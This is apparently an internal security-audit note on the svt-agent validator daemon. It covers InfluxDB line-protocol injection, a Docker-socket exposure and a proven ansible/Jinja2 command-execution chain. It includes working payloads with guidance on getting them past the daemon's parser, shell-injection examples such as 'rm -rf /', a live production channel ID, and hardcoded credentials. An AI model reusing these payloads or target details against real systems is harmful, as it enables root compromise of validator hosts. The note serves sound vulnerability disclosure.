# Daemon-Side Sink Audit — verified findings from the svt-agent engagement

When an on-chain command channel feeds an off-chain daemon, the daemon's own code is a
second attack surface independent of the on-chain auth question. These are the sink
classes worth auditing, with the verified outcomes from the worked case.

---

## 1. Third-party crate escaping gaps — audit the ESCAPING, not your own code

**Verified finding:** InfluxDB Line Protocol injection via `task.name`.

`svt-agent/src/notifier.rs` writes an attacker-influenced string straight into a field:

```rust
q.add_field("task_name", t.name.to_string())   // t.name from a decrypted on-chain message
```

The `influxdb` 0.6.0 crate escapes field values with:

```rust
lazy_static! {
    pub static ref QUOTES_SLASHES: Regex = Regex::new(r#"["\\]"#).unwrap();   // quotes + backslash ONLY
}
Text(v) => format!("\"{}\"", Self::escape_any(v, &QUOTES_SLASHES))
```

**No regex in the crate escapes `\n` or `\r`.** In line protocol a newline is a record
separator, so a value containing `\n` injects whole additional points.

Executed proof (standalone crate, `Timestamp::into_query(...).add_field(...)`):

```
name  : "restart\ninjected,tag=1 field=1"
line  : "events,event=task:start task_name=\"restart\ninjected,tag=1 field=1\" ..."
LINES : 2  <-- InfluxDB parses 2 separate points
```

**The generalizable lesson:** when a daemon forwards attacker-influenced strings into any
serialization format (line protocol, CSV, logfmt, syslog, SQL, JSON-in-JSON), go read the
*sink library's* escape function and enumerate exactly which characters its regex covers.
Newline and carriage return are the classic misses. Verify by executing the library, not
by reading its docs — the crate's own unit tests only covered quotes/backslashes/commas,
so its test suite would never have caught this.

**Severity note:** this is data forgery / corruption in the monitoring pipeline, not RCE.
Say so plainly. It matters (fake metrics can hide a real incident) but do not inflate it.

---

## 2. argv vs shell — the distinction that decides whether injection is real

`svt-agent/src/task_runner.rs` builds a command from attacker-influenced fields:

```rust
let mut cmd = vec!["ansible-playbook".to_string(), ...];
if !task.args.is_empty() {
    cmd.push(format!("--extra-vars={}", json!(task.args)));   // serde_json escapes correctly
}
cmd.push(format!("./playbooks/{}.yaml", task.name));          // <-- looks like injection
```

It is then handed to Docker via shiplift:

```rust
.cmd(cmd.iter().map(|c| c.as_str()).collect())   // Vec<String> -> argv, NO shell involved
```

**Consequences — get these right, they are opposite conclusions:**

| Payload in `task.name` | Outcome |
|---|---|
| `foo; rm -rf /` | **Inert.** No shell parses it; it becomes one argv element |
| `foo $(id)` | **Inert.** Same reason |
| `../../../../tmp/evil` | **Path traversal.** argv is `./playbooks/../../../../tmp/evil.yaml` |

So for `task.name` the sink is **path traversal, not command injection** — that part of
the earlier analysis was right.

**But the earlier conclusion "`json!(task.args)` is also safe … do not claim shell RCE"
was WRONG, and was disproven by execution in a later session.** See §2b. The argv
analysis stops one hop too early: the argv is handed to `ansible-playbook`, and Ansible
renders `--extra-vars` values through **Jinja2 before any shell sees them**.

**Rule (corrected):** before calling anything "command injection", confirm a shell is
actually in the path — `Command::new(...).args(...)`, `shiplift .cmd(Vec<String>)`, and
`std::process::Command` all pass argv directly. Only `sh -c`, `bash -c`,
`Command::new("sh").arg("-c")`, or a template rendered into a shell string give you
injection. **Then keep walking the chain one hop further:** if the argv target is itself
an interpreter/templating engine (ansible-playbook, `envsubst`, `make`, `xargs`, a
`docker exec` of a shell, `python -c`), that engine's own expansion step IS the shell.
Audit the *terminal* sink, not just the immediate one.

---

## 3. docker.sock mounted into a helper container = host-root surface

**Verified finding:** the task monitor mounts the Docker socket and publishes a port.

```rust
const MONITOR_IMAGE: &str = "amir20/dozzle:latest";
.volumes(vec!["/var/run/docker.sock:/var/run/docker.sock"])
.expose(8080, "tcp", self.opts.port as u32)          // DEFAULT_HOST_PORT = 8888
.env([&format!("DOZZLE_BASE=/{}",
      if !self.opts.secret.is_empty() { &self.opts.secret } else { "" })])
```

Two things to check whenever you see this shape:

- **`DOZZLE_BASE` is a base-path prefix, NOT authentication.** Dozzle has no built-in
  auth; anyone who can reach the port reads every container's logs. An empty `secret`
  (which the code explicitly permits) means no prefix at all.
- **`/var/run/docker.sock` in a container is equivalent to root on the host.** Even
  read-only log access leaks secrets from task output; anything that can reach the Docker
  API is worse.

`secret` came from `task.secret` — a field of the on-chain message, unvalidated — so it is
attacker-influenced rather than a real credential.

---

## 2b. `--extra-vars` → Jinja2 → `/bin/sh -c` — the PROVEN sink (trigger NOT reachable)

**This supersedes the "serde_json escapes properly, do not claim shell RCE" note in §2.
That note was wrong: the chain does terminate in a shell two hops after the argv analysis
ends. But the *trigger* was later disproven on mainnet — see the payload constraint below
and the parent SKILL.md's CORRECTION section. The sink is real and executes; reaching it
pre-auth is NOT proven.**

### Why it works

`build_cmd` emits one argv element:

```
--extra-vars={"validator_name":"...","cluster_rpc_address":"..."}
```

Ansible parses that as **extra-vars** — variables at the *highest* precedence, above
inventory, group_vars, and role defaults. The sv-manager playbooks then interpolate those
variables directly into `shell:` / `command:` modules:

```yaml
# roles/solana_validator_bootstrap/tasks/cluster_environment.yaml:3
- shell: solana config set --url {{ cluster_rpc_address }}

# roles/solana_validator_bootstrap/tasks/validator_info.yaml:36-48
- set_fact:
    shell_cmd: "solana validator-info publish ... -d \"{{ validator_description }}\" {{ validator_name }}"
- shell: "{{ shell_cmd }}"
```

Ansible renders the Jinja2 expression **first**, then passes the result to
`/bin/sh -c`. So a value containing `{{ lookup('pipe', '...') }}` is *evaluated as a
template* and the command runs. `serde_json` escaping is irrelevant — it only guarantees
the JSON is well-formed, and `{{ }}` survives JSON encoding untouched.

### Executed proof (real ansible-core 2.21.5, real role task files)

```bash
ansible-playbook -i inventory_hosts playbooks/pb_real_validator_info.yaml \
  --extra-vars='{"validator_name":"{{ lookup(\"pipe\", \"id -un > /tmp/PWN.txt; echo PWNED\") }}"}'
```

Ansible's own reported command, and the file the injected lookup wrote:

```
"cmd": "solana validator-info publish --keypair /home/solana/.secrets/validator-keypair.json  -d \"...\" PWNED2"
$ cat /tmp/PWN.txt
ubuntu
```

Confirmed independently on **two** real task files (`cluster_environment.yaml` via
`cluster_rpc_address`, `validator_info.yaml` via `validator_name`). No code changes, no
special privileges — only a crafted `--extra-vars` value, exactly what `build_cmd`
produces from an on-chain message.

### ⚠️ CRITICAL — the payload must survive `parse_args` first

**The first PoC in this section used a payload containing SPACES and claimed success. It
does not survive the daemon's own parser.** `converter.rs::parse_args` runs
`split_whitespace()` **before** `split('=')`:

```rust
for arg in args.into().split_whitespace() {      // <-- spaces split the value
    let mut chunks = arg.split('=');
    ...
}
```

Executed proof (standalone Rust harness mirroring `convert_message_to_task` + `build_cmd`):

```
args   = "validator_name={{ lookup('pipe','id -un > /tmp/PWN.txt') }}"
parsed = {"validator_name": "{{"}          ← TRUNCATED. Payload destroyed.

args   = "validator_name={{lookup('pipe','id>/tmp/rcetest/PWNED')}}"
parsed = {"validator_name": "{{lookup('pipe','id>/tmp/rcetest/PWNED')}}"}   ← INTACT
```

**Rule: any value that must survive a `split_whitespace()` → `split('=')` parser must
contain no spaces at all.** Write shell payloads accordingly — `cmd>/path` (no space before
the redirect target), `;`-free, no `&&`. Always verify the parse in a standalone Rust
harness before claiming a payload works end-to-end. A payload that renders correctly in a
bare `ansible-playbook` invocation proves nothing about the daemon path, because the daemon
mangles it first.

### Reproducing it without the daemon

You do not need the Rust binary, Docker, or a live chain. Build a minimal harness:

1. Copy `sv-manager/roles/`, `playbooks/`, `ansible.cfg` into a scratch dir.
2. Write an inventory with `ansible_connection=local` and a host in the group the
   playbook targets (`[mainnet_validators]`).
3. Copy `inventory_example/group_vars/all.yml` + the cluster file into `group_vars/`.
4. **Stub the binaries the playbook calls** (`solana`, `solana-keygen`, `agave-validator`
   → a script that echoes and exits 0) and pass `-e env_path=<stubdir>`, otherwise the
   first task aborts the play before the sink is reached.
5. Drop `callback_whitelist = debug` / `stdout_callback = debug` from `ansible.cfg` —
   the `debug` callback plugin is not bundled with `ansible-core` and fails the run with
   `[ERROR]: Could not load 'debug' callback plugin.` Use `stdout_callback = default`.
6. Use `-vv` to see the rendered `cmd` in the task result — that is the proof artifact.
7. If the real task uses `become_user: solana`, it fails locally with
   `chmod: invalid mode: 'A+user:solana:rx:allow'`. Isolate the injection with
   `become: no` — the Jinja2→shell rendering is identical either way.

### The generalizable rule

**Any value that reaches a templating engine is a code-exec sink, regardless of how it
was encoded on the way there.** The audit question is not "is this string escaped for its
transport?" but "what does the *terminal consumer* do with it?" Walk the chain to the end:

```
on-chain msg → decrypt → JSON → argv (escaped, safe) → ansible-playbook
  → Jinja2 render (UNSAFE) → /bin/sh -c → RCE as root
```

Watch for this shape anywhere a daemon builds a command line for an interpreter:
`ansible-playbook`, `envsubst`, `make -f`, `xargs`, `docker exec sh -c`, `python -c`,
`eval`-style config loaders, and any `*.j2` / `*.template` file rendered at runtime.
Grep for the *consumer* side: `--extra-vars`, `-e KEY=`, `template:`, and
`{{ var }}` inside `shell:`/`command:`/`run:` blocks.

### Impact (quote the volume list verbatim — §4)

The task container runs `network_mode: "host"` and `volumes_from` the agent container,
which mounts `/var/run/docker.sock`, `/root/.ssh` (validator host root key), and the
validator keypair, as `USER root`. So **if** a message can be posted, this is RCE as root
on a validator host, not a sandboxed container escape.

### Note on the auth gate — READ THIS BEFORE CALLING IT PRE-AUTH

The on-chain membership question is a *separate* finding, and it was resolved **negatively**
on mainnet. The agent never checks `message.sender` (`convert_message_to_task` ignores it
entirely), so encryption is not a boundary — anyone who can produce a message that decrypts
under the channel CEK gets execution. **But producing such a message requires a valid
Authorized membership, and no path from Pending to Authorized was found.** See
`permissionless-join-self-authorize-rce.md` §1.

So the correct framing is: **sink PROVEN, trigger NOT reachable pre-auth.** Report the sink
as a weaponised-but-gated primitive (it becomes Critical the instant the membership gate is
relaxed or a second bug appears), and report the permissionless `join_channel` +
status-skipping `add_device` as the separate pre-auth findings they actually are.

### The forge is definitively dead — stop re-testing it

A later session re-opened the forge question and burned four variants before closing it
with the error-code pairing test. **The result, for the record:**

```
genuine program-owned Pending membership → post_message → Unauthorized (6000)
forged system-owned, byte-perfect        → post_message → InvalidMembership (6002)
```

Four forge variants were tried and all failed identically — 88 bytes (no discriminator,
fields@[0:32]/[32:64]), 96 bytes (disc + fields), 128 bytes (disc + fields, exact borsh
read size), and 160 bytes (exact clone of a real account with only `authority` patched).
Every one had the correct `channel`, the correct `authority` (equal to the signer), and
`status = 0`. **Ownership was the only remaining variable.**

Supporting diagnostics: the forged path consumed **27,616 CU** vs **12,356 CU** for the
genuine account (more work = it attempted the full deserialize and field comparison before
dying), and `ChannelMembership::space()` = 160 (includes 32 bytes of MAX_* name padding)
while borsh only needs **128** bytes to read the struct with an empty `name` — so a
96-byte account fails on truncation and a 128-byte account parses but still fails
ownership. Rent ladder: 88B → 1,097,280 · 96B → 1,137,920 · 128B → 1,300,480 ·
160B → 1,463,040 lamports.

**Do not spend another round on this forge.** The method that closed it is in
`exploitability-proof-method.md` §6 — two simulations, zero sends.

**Verification discipline:** do not upgrade severity without proof. In the worked case
every probe of the candidate Dozzle hosts resolved to Cloudflare edge (301 to HTTPS), not
to a validator host — so that stayed a "high-if-exposed" hardening finding, honestly
labelled.

---

## 4. Config leaks that hand the attacker the target map

`svt-agent/docker-compose.yml` contained a live production identifier:

```yaml
- AGENT_CHANNEL_ID=3Pb2CPq8pjUECdMDhsSnXBM59c7KWazrR8m7W9tCEECB
```

Confirmed live on mainnet: channel `svt_5afRnmkFn1pRU9UkL16Jz4qNf574`, private, 3 members,
agent membership `name='agent'` with `last_read=1` (live and caught up), device pubkey public.

Not a vulnerability on its own, but it converts "find the fleet" into "here is one host."
Always grep compose files, Dockerfiles, CI env blocks, and `install.sh` for production
identifiers, then verify each against the live chain and report them as
target-enabling disclosures.

Related install-time surface from the same file — what a successful task execution buys:

```
-v /var/run/docker.sock:/var/run/docker.sock     # Docker daemon control
-v /etc/sv_manager:/etc/sv_manager               # validator config
-v $SSHKEY_PATH:/root/.ssh                       # root SSH private key
-v $KEYPAIR_PATH:/app/keypair.json               # validator keypair
USER root
```

That volume list is the impact argument for any sink in this daemon — quote it verbatim in
the report so the severity is self-evident.

---

## 5. Hardcoded credentials in constants

`svt-agent/src/constants.rs`:

```rust
pub const NOTIFY_INFLUX_USER: &str = "v_user";
pub const NOTIFY_INFLUX_PASS: &str = "thepassword";
pub const NOTIFY_INFLUX_URL:  &str = "http://influx.thevalidators.io:8086";   // plain HTTP
```

Grep every daemon repo for credential-shaped constants and check the transport scheme.
Plain-HTTP credential transmission is a separate finding from the hardcoding itself.
